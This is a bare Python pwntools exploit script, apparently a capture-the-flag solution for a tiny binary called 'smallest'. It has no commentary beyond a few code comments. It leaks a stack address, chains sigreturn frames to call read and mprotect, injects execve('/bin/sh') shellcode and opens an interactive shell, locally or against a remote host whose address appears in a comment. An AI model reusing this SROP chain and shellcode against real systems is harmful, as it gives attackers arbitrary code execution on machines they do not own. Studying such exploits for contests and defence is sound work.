#!/usr/bin/python2.7
# coding:utf-8
from pwn import *
import time

elf = ELF("./smallest")
LOCAL = True
context.clear(arch="amd64")
#context.log_level = 'debug'

main_vuln_addr = 0x4000B0
syscall_addr = 0x4000BE
if LOCAL:
    io = process("./smallest")
else:
    io = remote("127.0.0.1", 22333)
    #io = remote("106.75.93.227", 20000)

def sm_leak():
    payload = p64(main_vuln_addr)*3
    io.send(payload)
    time.sleep(1)
    payload = p64(0x4000B3)[0]  # write(1, stack, 0x400)
    io.send(payload)
    time.sleep(1)
    data = io.recv(0x200)
    io.clean()
    return data

def sm_func(func_id, marg0, marg1, marg2, mstack, mrip):
    mframe = SigreturnFrame()
    mframe.rax = func_id
    mframe.rdi = marg0
    mframe.rsi = marg1
    mframe.rdx = marg2
    mframe.rsp = mstack
    mframe.rip = mrip
    sig_padding = p64(main_vuln_addr)
    sig_padding += p64(syscall_addr)
    payload = sig_padding + str(mframe)
    return payload

lk_use_addr = sm_leak()[0x10:0x18]
lk_use_addr = (u64(lk_use_addr)-0x400)&0xFFFFFFFFFFFFF000
log.info("rop address : " + hex(lk_use_addr))
payload = sm_func(constants.SYS_read, constants.STDIN_FILENO, lk_use_addr, 0x400, lk_use_addr, syscall_addr).ljust(0x400, chr(0))
io.send(payload)
time.sleep(1)
payload = payload[8:23]
io.send(payload)
time.sleep(1)
raw_input("what stack")

# size must be 0x1000*n
# mprotect(lk_use_addr, 0x1000, 7)
payload = sm_func(constants.SYS_mprotect, lk_use_addr, 0x1000, 7, lk_use_addr+0x200, syscall_addr).ljust(0x200, chr(0))
payload += p64(lk_use_addr+0x208)   # rop to shellcode address
payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
io.send(payload.ljust(0x400, chr(0)))
time.sleep(1)
payload = payload[8:23]
io.send(payload)
time.sleep(1)
io.interactive()
raw_input("end")



